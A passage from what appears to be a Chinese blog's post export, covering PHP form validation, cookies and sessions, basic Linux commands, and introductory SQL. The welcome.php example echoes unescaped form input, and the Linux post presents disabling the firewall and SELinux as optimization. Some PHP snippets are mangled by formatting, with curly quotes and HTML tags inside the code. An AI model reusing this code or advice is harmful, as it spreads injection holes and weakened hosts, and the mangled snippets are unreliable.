class="line">6</span><br></pre></td><td class="code"><pre><span class="line">注释：preg_match() 函数检索字符串的模式，如果模式存在则返回 true，否则返回 false。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**PHP - 验证 E-mail**</span><br><span class="line">以下代码展示的简单方法检查 e-mail 地址语法是否有效。如果无效则存储一条错误消息：</span><br></pre></td></tr></table></figure><p>$email = test_input($_POST[“email”]);<br>if (!preg_match(“/([\w-]+@[\w-]+.[\w-]+)/“,$email)) {<br>  $emailErr = “无效的 email 格式！”;<br>}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">**PHP - 验证 URL**</span><br><span class="line">以下代码展示的方法检查 URL 地址语法是否有效（这条正则表达式同时允许 URL 中的斜杠）。如果 URL 地址语法无效，则存储一条错误消息：</span><br></pre></td></tr></table></figure><p>$website = test_input($<em>POST[“website”]);<br>if (!preg_match(“/\b(?:(?:https?|ftp)://|www.)[-a-z0-9+&amp;@#/%?=<del>_|!:,.;]*[-a-z0-9+&amp;@#/%<br>=</del></em>|]/i”,$website)) {<br>  $websiteErr = “无效的 URL”;<br>}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line">**PHP - 验证 Name、E-mail、以及 URL**</span><br><span class="line">现在，脚本是这样的：</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure><?php// 定义变量并设置为空值$nameErr = $emailErr = $genderErr = $websiteErr = "";$name = $email = $gender = $comment = $website = "";if ($_SERVER["REQUEST_METHOD"] == "POST") {  if (empty($_POST["name"])) {    $nameErr = "Name is required";  } else {    $name = test_input($_POST["name"]);    // 检查名字是否包含字母和空格    if (!preg_match("/^[a-zA-Z ]*$/",$name)) {      $nameErr = "只允许字母和空格"; //名字输错错误提示     }  }  if (empty($_POST["email"])) {    $emailErr = "Email is required";  } else {    $email = test_input($_POST["email"]);    // 检查电邮地址语法是否有效    if (!preg_match("/([\w\-]+\@[\w\-]+\.[\w\-]+)/",$email)) {      $emailErr = "非法邮箱格式";  //邮箱输错错误提示    }  }  if (empty($_POST["website"])) {    $website = "";  } else {    $website = test_input($_POST["website"]);    // 检查 URL 地址语言是否有效（此正则表达式同样允许 URL 中的下划线）    if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%    =~_|]/i",$website)) {      $websiteErr = "非法的URL地址";  //网址输错错误提示    }  }  if (empty($_POST["comment"])) {    $comment = "";   } else {    $comment = test_input($_POST["comment"]);  }  if (empty($_POST["gender"])) {    $genderErr = "性别是必须的"; //性别没有选择时的错误提示  } else {    $gender = test_input($_POST["gender"]);  }}?><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">### 表单验证-完成表单实例</span><br><span class="line">**本节展示如何在用户提交表单后保留输入字段中的值。**</span><br><span class="line"></span><br><span class="line">**PHP - 保留表单中的值**</span><br><span class="line">如需在用户点击提交按钮后在输入字段中显示值，我们在以下输入字段的 value 属性中增加了一小段 PHP 脚本：name、email 以及 website。在 comment 文本框字段中，我们把脚本放到了 &lt;textarea&gt; 与 &lt;&#x2F;textarea&gt; 之间。这些脚本输出 $name、$email、$website 和 $comment 变量的值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后，我们还需要显示选中了哪个单选按钮。对此，我们必须操作 checked 属性（而非单选按钮的 value 属性）：</span><br></pre></td></tr></table></figure><p>Name: <input type="text" name="name" value="<?php echo $name;?>"></p><p>E-mail: <input type="text" name="email" value="<?php echo $email;?>"></p><p>Website: <input type="text" name="website" value="<?php echo $website;?>"></p><p>Comment: <textarea name="comment" rows="5" cols="40"><?php echo $comment;?></textarea></p><p>Gender:</p><p>&lt;input type=”radio” name=”gender”<br><?php if (isset($gender) && $gender=="female") echo "checked";?><br>value=”female”&gt;Female<br>&lt;input type=”radio” name=”gender”<br><?php if (isset($gender) && $gender=="male") echo "checked";?><br>value=”male”&gt;Male</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 高级教程</span><br><span class="line">### PHP Cookies</span><br><span class="line">**cookie 常用于识别用户。**</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">**什么是 Cookie？**</span><br><span class="line">cookie 常用于识别用户。cookie 是服务器留在用户计算机中的小文件。每当相同的计算机通过浏览器请求页面时，它同时会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**如何创建 cookie？**</span><br><span class="line">setcookie() 函数用于设置 cookie。</span><br><span class="line"></span><br><span class="line">注释：setcookie() 函数必须位于 &lt;html&gt; 标签之前。</span><br></pre></td></tr></table></figure><p>语法<br>setcookie(name, value, expire, path, domain);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**例子**</span><br><span class="line">在下面的例子中，我们将创建名为 &quot;user&quot; 的 cookie，把为它赋值 &quot;Alex Porter&quot;。我们也规定了此 cookie 在一小时后过期：</span><br></pre></td></tr></table></figure><?php setcookie("user", "Alex Porter", time()+3600);?><html><body></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注释：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 setrawcookie() 取而代之）。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**如何取回 Cookie 的值？**</span><br><span class="line">PHP 的 $_COOKIE 变量用于取回 cookie 的值。</span><br><span class="line"></span><br><span class="line">在下面的例子中，我们取回了名为 &quot;user&quot; 的 cookie 的值，并把它显示在了页面上：</span><br></pre></td></tr></table></figure><?php// 输出 cookie值echo $_COOKIE["user"];<p>// 查看所有 cookie<br>print_r($_COOKIE);<br>?&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在下面的例子中，我们使用 isset() 函数来确认是否已设置了 cookie：</span><br></pre></td></tr></table></figure><html><body><?phpif (isset($_COOKIE["user"]))  echo "欢迎 " . $_COOKIE["user"] . "!<br />";else  echo "普通访客!<br />";?></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line">**如何删除 cookie？**</span><br><span class="line">当删除 cookie 时，您应当使过期日期变更为过去的时间点。</span><br><span class="line"></span><br><span class="line">删除的例子：</span><br></pre></td></tr></table></figure><?php // 设置 cookie 过期时间为过去 1 小时setcookie("user", "", time()-3600);?><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果浏览器不支持 cookie 该怎么办？</span><br><span class="line">如果您的应用程序涉及不支持 cookie 的浏览器，您就不得不采取其他方法在应用程序中从一张页面向另一张页面传递信息。一种方式是从表单传递数据（有关表单和用户输入的内容，稍早前我们已经在本教程中介绍过了）。</span><br><span class="line"></span><br><span class="line">下面的表单在用户单击提交按钮时向 &quot;welcome.php&quot; 提交了用户输入：</span><br></pre></td></tr></table></figure><html><body><form action="welcome.php" method="post">名字: <input type="text" name="name" />年龄: <input type="text" name="age" /><input type="submit" /></form></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">取回 &quot;welcome.php&quot; 中的值，就像这样：</span><br></pre></td></tr></table></figure><html><body><p>欢迎 <?php echo $_POST["name"]; ?>.<br /><br>你 <?php echo $_POST["age"]; ?> 岁了。</p></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### PHP Sessions</span><br><span class="line"></span><br><span class="line">PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"></span><br><span class="line">**PHP Session 变量**</span><br><span class="line"></span><br><span class="line">当您运行一个应用程序时，您会打开它，做些更改，然后关闭它。这很像一次会话。计算机清楚你是谁。它知道你何时启动应用程序，并在何时终止。但是在因特网上，存在一个问题：服务器不知道你是谁以及你做什么，这是由于 HTTP 地址不能维持状态。</span><br><span class="line"></span><br><span class="line">通过在服务器上存储用户信息以便随后使用，PHP session 解决了这个问题（比如用户名称、购买商品等）。不过，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久储存信息，可以把数据存储在数据库中。</span><br><span class="line"></span><br><span class="line">Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**开始 PHP Session**</span><br><span class="line">在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</span><br><span class="line"></span><br><span class="line">注释：session_start() 函数必须位于 &lt;html&gt; 标签之前：</span><br></pre></td></tr></table></figure><?php session_start(); ?><html><body></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line">**存储 Session 变量**</span><br><span class="line">存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量：</span><br></pre></td></tr></table></figure><?phpsession_start();// 存储 session 数据$_SESSION['views']=1;?><html><body><?php//检索 session 数据echo "浏览量=". $_SESSION['views'];?></body></html><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br></pre></td></tr></table></figure>浏览量=1<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在下面的例子中，我们创建了一个简单的 page-view 计数器。**isset() 函数**检测是否已设置 &quot;views&quot; 变量。如果已设置 &quot;views&quot; 变量，我们累加计数器。如果 &quot;views&quot; 不存在，则我们创建 &quot;views&quot; 变量，并把它设置为 1：</span><br></pre></td></tr></table></figure><?phpsession_start();<p>if(isset($_SESSION[‘views’]))<br>  $_SESSION[‘views’]=$_SESSION[‘views’]+1;</p><p>else<br>  $_SESSION[‘views’]=1;<br>echo “浏览量=”. $_SESSION[‘views’];<br>?&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">----------</span><br><span class="line">**销毁 Session**</span><br><span class="line"></span><br><span class="line">如果您希望删除某些 session 数据，可以使用 **unset()** 或 **session_destroy()** 函数。</span><br><span class="line"></span><br><span class="line">unset() 函数用于释放指定的 session 变量：</span><br></pre></td></tr></table></figure><?phpunset($_SESSION['views']);?><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">您也可以通过 session_destroy() 函数彻底终结 session：</span><br></pre></td></tr></table></figure><?phpsession_destroy();?><p>注释：session_destroy() 将重置 session，您将失去所有已存储的 session 数据。<br>```</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="posts/15691.html"/>
      <url>posts/15691.html</url>
      
        <content type="html"><![CDATA[<h2 id="linux系统基础"><a href="#linux系统基础" class="headerlink" title="linux系统基础"></a>linux系统基础</h2><p>uname -a<br>nuame -r : 查看内核版本号(主版本号.此版本号.修正次数)3.10.0<br>次版本号：若偶数，表示稳定版内核，奇数为开发版内核</p><p>fdisk -l : 查看查看硬盘大小以及分区<br>信息内容：<br>其中第一行： Disk /dev/sda ： 硬盘大小(其是除1000得出来的) ，字节<br>在linux中一切皆文件，sda就是硬盘的文件名 sd表示硬盘接口，a 表示第一块硬盘，若sda1，1为第一分区</p><p>cat /proc/cpuinfo： 查看系统cpu信息<br>信息内容：</p><ul><li>processor： 表示第几个核心，第一个核心显示为0</li><li>model_name： CPU版本</li><li>flags：（显示了你的cpu所带的功能，比如你的cpu支不支持硬件虚拟化，支不支持超频等）</li></ul><p>cat /proc/meminfo： 查看内存信息</p><h3 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a>系统优化</h3><ul><li>关闭防火墙</li><li>关闭selinux服务</li></ul><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>Centos7默认安装了firewalld，如果没有安装的话，可以使用 yum install firewalld firewalld-config进行安装。</p><p>1.启动防火墙<br>systemctl start firewalld </p><p>2.禁用防火墙<br>systemctl stop firewalld</p><p>3.设置开机启动<br>systemctl enable firewalld</p><p>4.停止并禁用开机启动<br>sytemctl disable firewalld</p><p>5.重启防火墙<br>firewall-cmd –reload</p><p>6.查看状态<br>systemctl status firewalld或者 iptables -nL</p><p>7.查看版本<br>firewall-cmd –version</p><p>8.查看帮助<br>firewall-cmd –help</p><h4 id="selinux服务"><a href="#selinux服务" class="headerlink" title="selinux服务"></a>selinux服务</h4><p><strong>查看selinux状态</strong><br>sestatus（SElinux STATUS）查看状态。</p><p>还有一种方法，可以直接看模式。<br>getenforce查看当前模式。disable就是代表关闭</p><p><strong>配置：</strong><br>selinux的配置文件是/etc/selinux/config</p><p>vim /etc/selinux/config打开selinux配置文件<br>selinux有三种模式： enforcing开启； permissive，不开启但有通知； disabled 关闭</p><p>配置完成后 reboot命令，重启生效</p><h4 id="安装-vmware-tools"><a href="#安装-vmware-tools" class="headerlink" title="安装 vmware-tools"></a>安装 vmware-tools</h4><p>安装这个支持物理机和虚拟机之间的文件拖拽，复制，粘贴等。<br>在安装linux的时候，选择以什么形式安装时(最小安装，GUI等)，选择附加一个开发工具<br>从光盘中考出压缩包，右键解压缩到桌面<br>./wmware-install.pl -d   #-d就是default默认安装的意思，不然后边会有很多选项要问你</p><h3 id="linux中根目录-中各文件夹的作用"><a href="#linux中根目录-中各文件夹的作用" class="headerlink" title="linux中根目录/中各文件夹的作用"></a>linux中根目录/中各文件夹的作用</h3><ul><li><p>/ ：根目录 系统的起始目录</p></li><li><p>/bin：保存了管理员和普通用户都可以执行的命令字</p></li><li><p>/sbin：只有管理员可以执行的命令</p></li><li><p>/boot：引导目录 它是一个独立的分区，挂载的分区是/dev/sda1 ，具有内核、启动菜单还有初始化镜像光盘(驱动盘)</p></li><li><p>/dev：device设备文件存放目录。 什么是设备文件，比如：硬盘 /dev/sda 这就是设备文件</p></li><li><p>/etc 配置文件存放目录。 配置文件：比如调整了屏幕分辨率，下次电脑重启的时候还是调整过后的分辨率，etc就是存储了配置信息的，每次启动时，内存加载它们，然后系统就根据其定义</p></li><li><p>/home：普通用户的家目录  保存了各个普通用户的配置文件</p></li><li><p>/root：root用户的家目录 超级管理员有自己的一个单独的目录root</p></li><li><p>/media(媒体)：光驱默认的挂载目录(光盘放入，就上这找)</p></li><li><p>/mnt(mount): 临时设备的挂载目录(u盘等外界设备接入，就上这找)</p></li><li><p>/proc：process进程，进程状态存放目录（内存状态，不占用硬盘空间）</p></li><li><p>/tmp：临时文件存放目录</p></li><li><p>/usr：GNU社区软件的默认安装目录</p></li><li><p>/var：常变文件存放目录 eg：日志文件存放目录 </p></li><li><p>/lib 和/lib64 ： 函数库(开发相关，安全方向关联)</p></li><li><p>还有一些不太重要的文件夹，就不一一叙说了</p></li></ul><h3 id="linux中颜色的相关表示"><a href="#linux中颜色的相关表示" class="headerlink" title="linux中颜色的相关表示"></a>linux中颜色的相关表示</h3><p>颜色：</p><ul><li>蓝色字体：目录</li><li>浅蓝色：表示符号链接(快捷方式)</li><li>黑色：普通文件，在纯命令行界面，为白色</li><li>绿色：表示可执行文件</li><li>红色：压缩文件或者包文件</li><li>黑底黄字：设备文件</li><li>紫色：图片文件 或 模块文件</li><li>红色闪烁： 表示链接文件有问题了</li></ul><h3 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用“dircolors -p”命令可以看到颜色设置，包括个颜色和“粗体”，下划线，闪烁等的定义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost &#x2F;]#</span><br><span class="line">[当前登录的用户名@主机名 当前工作的目录名称]</span><br><span class="line">当前工作目录名称有一个特殊 ~：表示自己的home</span><br><span class="line">&#96;#&#96;：表示当前用户为超级管理员root</span><br><span class="line">&#96;$&#96;：表示当前用户身份为普通用户</span><br></pre></td></tr></table></figure><h2 id="linux的基础命令"><a href="#linux的基础命令" class="headerlink" title="linux的基础命令"></a>linux的基础命令</h2><ul><li><p>ls ：列出当前目录下的内容。 ls -l：显示文件长信息</p></li><li><p>pwd：列出当前工作目录（print working directory</p></li><li><p>cd： 改变目录(绝对路径(从 根目录 /出发的绝对路径)，相对路径(所在目录与目标目录的相对路径) change directory)</p></li><li><p>cat：查看文件内容。 cat -n 在显示文件内容的同时显示文件行号<br>touch：建立一个空文件 eg： touch linux.txt(后缀不重要) 和 更新文件的时间标记 两个功能</p></li><li><p>echo：输出 电脑显示屏上输出，但可以通过重定向符号 &gt; 输出到别的地方<br>例如： echo “I love you” &gt; linux.txt 则将内容重定向写到了linux.txt文件中。用单个 &gt; 将内容编写到linux.txt文件中会覆盖原先的内容，此时只要用<br>echo “I love you” &gt;&gt; linux.txt 就可以追加内容，而不覆盖</p></li><li><p>mkdir：创建目录  -p：递归建立目录父目录 eg：mkdir -p /tmp/a/b/c 创建目录时，当发现父目录不存在的时候，会立刻创建父目录</p></li><li><p>mv：move 两个功能：1.剪切 mv linux.txt /root/Desktop/ 2.重命名 mv 原文件名字 要改的名字<br>两个功能一起用：mv /root/Desktop/a.txt /tmp/b.txt<br>将桌面的文件a 剪切到 tmp文件夹中，并且重命名为b</p></li><li><p>cp：copy 复制文件 eg：copy 文件名 到哪个地方。  cp -r：递归复制，此方法可以用来拷贝目录，因为目录中有很多文件，不加参数-r拷贝目录的话会报错。</p></li><li><p>rm：remove 移除 remove 文件名 ，删文件的时候会要求你确认是否删除，还要打上y才能删除 为了避免这种麻烦，使用 rm -f 就不会再次询问你了。 rm -rf ：递归强制删除， 可以删除目录</p></li><li><p>ln：链接建立 link 文件和目录都可以建立链接 ln -s 原文件(绝对路径) 链接文件<br>将文件夹 tmp中的a文件 链接到桌面，以alink命名<br>ln -s /tmp/a /root/Desktop/alink<br>注意： 链接的时候，原文件一定要用绝对路径来表示，不然建立的链接是一个坏的链接  -s 表示符号链接</p><h2 id="进阶命令"><a href="#进阶命令" class="headerlink" title="进阶命令"></a>进阶命令</h2><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">du -sh *    #查看当前路径下各个文件大小</span><br><span class="line">df -h        #查看硬盘空间 </span><br><span class="line">fdisk -l    #查看所挂载硬盘个数及分区情况</span><br></pre></td></tr></table></figure><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps -u  #可以看到当前进程的用户</span><br><span class="line">kill -9  #来强制终止退出</span><br><span class="line">ps -ef|grep LOCAL&#x3D;NO|grep -v grep|cut -c 9-15|xargs kill -9   # kill LOCAL&#x3D;NO 全部关联进程</span><br><span class="line">ps -ef|grep aaa|grep -v grep|awk  &#39;&#123;print &quot;kill -9 &quot; $2&#125;&#39; |sh    # 批量kill进程</span><br><span class="line">pkill -u name  #kill掉某个用户的所有进程</span><br><span class="line">killall -u name  #kill掉某个用户的所有进程</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>###查看进程，GPU</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi   #查看Nvidia显卡信息及使用情况</span><br><span class="line">gpustat     #这个更好</span><br><span class="line">top  #查看实时进程</span><br><span class="line">htop  #更形象的看cpu使用情况</span><br><span class="line">watch -n 0.5 nvidia-smi #周期性的输出显卡的使用情况 0.5s</span><br></pre></td></tr></table></figure><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nohup cmmand &amp;    #  后台运行而且退出登陆不停止运行</span><br><span class="line">cat nohup.out     #可以查看具体运行情况</span><br><span class="line"></span><br><span class="line">nohup sh classDBasketballPass.sh &amp;</span><br><span class="line">nohup sh classDBlowingBubbles.sh &amp;</span><br><span class="line">nohup sh classDBQSquare.sh &amp;</span><br><span class="line">nohup sh classDRaceHorses.sh &amp;</span><br><span class="line">#属于并行运行</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod  777 file_name    # 更改文件权限</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="远程文件传输"><a href="#远程文件传输" class="headerlink" title="远程文件传输"></a>远程文件传输</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P 4588 remote@111.11.111.11:&#x2F;usr&#x2F;local&#x2F;sin.sh &#x2F;home&#x2F;administrator  </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="posts/29900.html"/>
      <url>posts/29900.html</url>
      
        <content type="html"><![CDATA[<h2 id="SQL介绍"><a href="#SQL介绍" class="headerlink" title="SQL介绍"></a>SQL介绍</h2><p>结构化查询语言(Structured Query Language)简称SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。</p><h2 id="数据库CRUD操作"><a href="#数据库CRUD操作" class="headerlink" title="数据库CRUD操作"></a>数据库CRUD操作</h2><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 创建数据库 </span><br><span class="line">create database Qadbtesting;</span><br></pre></td></tr></table></figure><h3 id="指向创建的数据库及创建表"><a href="#指向创建的数据库及创建表" class="headerlink" title="指向创建的数据库及创建表"></a>指向创建的数据库及创建表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 用use命令指向要用的数据库 </span><br><span class="line">use Qadbtesting;</span><br><span class="line"># 创建表</span><br><span class="line">create table stuinfo(name varchar(20),id int,location varchar(20),age int);</span><br></pre></td></tr></table></figure><p>varchar(variable character可变长字符串)：用于表示字符数据，但可以保存可变长度的字符串</p><h3 id="将记录插入表"><a href="#将记录插入表" class="headerlink" title="将记录插入表"></a>将记录插入表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">describe stuinfo; # 显示表外部结构(列明，列的数据类型，有什么约束条件等)</span><br><span class="line"></span><br><span class="line"># 向表中插入记录</span><br><span class="line">insert into stuinfo value(&quot;Tim&quot;,100,&quot;Shenzhen&quot;,25);</span><br><span class="line">insert into stuinfo value(&quot;Jack&quot;,101,&quot;Shenzhen&quot;,23);</span><br><span class="line">insert into stuinfo value(&quot;Rose&quot;,102,&quot;Shanghai&quot;,27);</span><br><span class="line">insert into stuinfo value(&quot;Lucy&quot;,103,&quot;Beijing&quot;,21);</span><br></pre></td></tr></table></figure><h3 id="从表中检索记录"><a href="#从表中检索记录" class="headerlink" title="从表中检索记录"></a>从表中检索记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法： select 要查找的列 from 表</span><br><span class="line">* 通配符，查找所有的列</span><br><span class="line"></span><br><span class="line">select name,id,location,age from stuinfo;</span><br><span class="line"></span><br><span class="line">select * from stuinfo;</span><br></pre></td></tr></table></figure><h2 id="改变Table-Schema操作"><a href="#改变Table-Schema操作" class="headerlink" title="改变Table Schema操作"></a>改变Table Schema操作</h2><h3 id="在表中添加和修改记录"><a href="#在表中添加和修改记录" class="headerlink" title="在表中添加和修改记录"></a>在表中添加和修改记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">添加列</span><br><span class="line">alter：修改的意思</span><br><span class="line">语法： alter table 表 add 列 类型;</span><br><span class="line"></span><br><span class="line">alter table stuinfo add department varchar(20);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改列语法： alter table 表 modify 列 类型;</span><br><span class="line">alter table stuinfo modify department varchar(30);</span><br></pre></td></tr></table></figure><h3 id="删除记录并删除数据库"><a href="#删除记录并删除数据库" class="headerlink" title="删除记录并删除数据库"></a>删除记录并删除数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">删除列：</span><br><span class="line"></span><br><span class="line">alter table stuinfo drop department;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">删除数据库：</span><br><span class="line">drop database 数据库名</span><br><span class="line"></span><br><span class="line">use stuinfo # 先进到要删除的数据库</span><br><span class="line">drop database stuinfo</span><br></pre></td></tr></table></figure><h3 id="更新表中的行"><a href="#更新表中的行" class="headerlink" title="更新表中的行"></a>更新表中的行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 